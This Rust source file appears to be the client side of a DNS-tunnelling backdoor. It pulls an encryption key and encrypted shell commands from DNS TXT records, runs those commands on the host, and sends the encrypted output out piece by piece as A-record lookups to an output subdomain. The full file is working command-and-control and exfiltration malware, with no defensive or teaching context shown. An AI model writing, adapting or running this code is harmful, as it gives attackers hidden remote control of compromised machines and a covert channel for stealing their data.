mod config;
mod command;
mod dns;
mod crypto;

use anyhow::{Result, anyhow};
use tokio::time::sleep;

use crate::config::Config;
use crate::crypto::{Cipher, hex_decode, hex_encode};
use crate::dns::DnsClient;

struct DnsCommandClient {
    config: Config,
    dns_client: DnsClient,
    cipher: Option<Cipher>,
    last_cmd: Option<String>,
    consecutive_timeouts: u32,
}

impl DnsCommandClient {
    async fn new(config: Config) -> Result<Self> {
        let dns_client = DnsClient::new(&config.dns_server, config.dns_timeout()).await?;
        Ok(Self {
            config,
            dns_client,
            cipher: None,
            last_cmd: None,
            consecutive_timeouts: 0,
        })
    }

    async fn get_cipher_info(&mut self) -> Result<(Vec<u8>, Vec<u8>)> {
        let mut key = None;
        let mut nonce = None;

        for i in 1..3 {
            let query = format!("{}.{}", i, self.config.cipher_subdomain());
            if let Some(txt) = self.dns_client.query_txt(&query).await? {
                let txt_str = txt;
                if i == 1 {
                    if txt_str.starts_with("total-2-") {
                        let hex_key = txt_str.split('-').nth(2)
                            .ok_or_else(|| anyhow!(""))?;
                        key = Some(hex_decode(hex_key)?);
                    }
                } else {
                    nonce = Some(hex_decode(&txt_str)?);
                }
            }
        }

        match (key, nonce) {
            (Some(k), Some(n)) => Ok((k, n)),
            _ => Err(anyhow!(""))
        }
    }

    async fn get_command_fragments(&mut self) -> Result<Vec<String>> {
        let mut frags = Vec::new();
        
        let query = format!("1.{}", self.config.cmd_subdomain());
        if let Some(txt) = self.dns_client.query_txt(&query).await? {
            let txt_clone = txt.clone();
            frags.push(txt);
            
            if txt_clone.starts_with("total-") {
                if let Some(num) = txt_clone.split('-').nth(1) {
                    if let Ok(total) = num.parse::<usize>() {
                        for i in 2..=total {
                            let query = format!("{}.{}", i, self.config.cmd_subdomain());
                            if let Some(txt) = self.dns_client.query_txt(&query).await? {
                                frags.push(txt);
                            } else {
                                break;
                            }
                        }
                    }
                }
            }
        }
        
        Ok(frags)
    }

    fn decrypt_command(&self, frags: Vec<String>) -> Result<String> {
        if frags.is_empty() {
            return Ok(String::new());
        }

        let cipher = self.cipher.as_ref()
            .ok_or_else(|| anyhow!(""))?;

        let mut lista_ordenada = vec![String::new(); frags.len()];

        for frag in frags {
            if frag.starts_with("total-") {
                let parts: Vec<&str> = frag.split('-').collect();
                if parts.len() >= 3 {
                    if let Ok(num) = parts[1].parse::<usize>() {
                        lista_ordenada = vec![String::new(); num];
                        lista_ordenada[0] = parts[2].to_string();
                    }
                }
            } else {
                let idx = lista_ordenada.iter().filter(|x| !x.is_empty()).count();
                if idx < lista_ordenada.len() {
                    lista_ordenada[idx] = frag;
                }
            }
        }

        let hex_str = lista_ordenada.join("");
        if let Ok(ciphertext) = hex_decode(&hex_str) {
            if let Ok(decrypted) = cipher.decrypt(&ciphertext) {
                return Ok(String::from_utf8_lossy(&decrypted).to_string());
            }
        }

        Ok(String::new())
    }

    async fn send_output_fragments(&mut self, fragments: Vec<String>) -> Result<()> {
        if fragments.is_empty() {
            return Ok(());
        }

        let total = fragments.len();
        
        let query = format!("data-{}-{}.1.{}", total, fragments[0], self.config.output_subdomain());
        let _ = self.dns_client.query_a(&query).await;
        sleep(self.config.response_delay()).await;

        for (i, frag) in fragments.iter().enumerate().skip(1) {
            let query = format!("{}.{}.{}", frag, i + 1, self.config.output_subdomain());
            let _ = self.dns_client.query_a(&query).await;
            sleep(self.config.response_delay()).await;
        }

        Ok(())
    }

    fn fragmentar_mensaje(&self, mensaje: &str, max_len: usize) -> Result<Vec<String>> {
        let cipher = self.cipher.as_ref()
            .ok_or_else(|| anyhow!(""))?;

        let ciphertext = cipher.encrypt(mensaje.as_bytes())?;
        let hex_str = hex_encode(&ciphertext);
        
        let mut partes: Vec<String> = hex_str
            .as_bytes()
            .chunks(max_len)
            .map(|chunk| String::from_utf8_lossy(chunk).to_string())
            .collect();

        if partes.len() > 1 {
            partes[0] = format!("total-{}-{}", partes.len(), partes[0]);
        }

        Ok(partes)
    }

    async fn run(&mut self) -> Result<()> {
        let (key, nonce) = self.get_cipher_info().await?;
        self.cipher = Some(Cipher::new(&key, &nonce)?);

        loop {
            let frags = self.get_command_fragments().await?;
            
            if frags.is_empty() {
                let query = format!("1.{}", self.config.cmd_subdomain());
                match self.dns_client.query_txt(&query).await {
                    Ok(Some(_)) => {
                        self.consecutive_timeouts = 0;
                    },
                    Ok(None) => {
                        self.consecutive_timeouts = 0;
                    },
                    Err(_) => {
                        self.consecutive_timeouts += 1;
                        if self.consecutive_timeouts >= 3 {
                            return Ok(());
                        }
                    }
                }
                sleep(self.config.check_delay()).await;
                continue;
            }

            self.consecutive_timeouts = 0;

            let cmd = self.decrypt_command(frags)?;
            if cmd.trim().is_empty() {
                sleep(self.config.check_delay()).await;
                continue;
            }

            if Some(&cmd) == self.last_cmd.as_ref() {
                sleep(self.config.check_delay()).await;
                continue;
            }

            self.last_cmd = Some(cmd.clone());

            if cmd.trim().to_lowercase() == "exit" {
                let out_frags = self.fragmentar_mensaje("__EXIT__", self.config.max_label_len - 20)?;
                let _ = self.send_output_fragments(out_frags).await;
                return Ok(());
            }

            let output = command::run_command(&cmd)?;
            
            let out_frags = self.fragmentar_mensaje(&output, self.config.max_label_len - 20)?;
            let _ = self.send_output_fragments(out_frags).await;
            sleep(self.config.check_delay()).await;
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let config = Config::default();
    let mut client = DnsCommandClient::new(config).await?;
    client.run().await
}
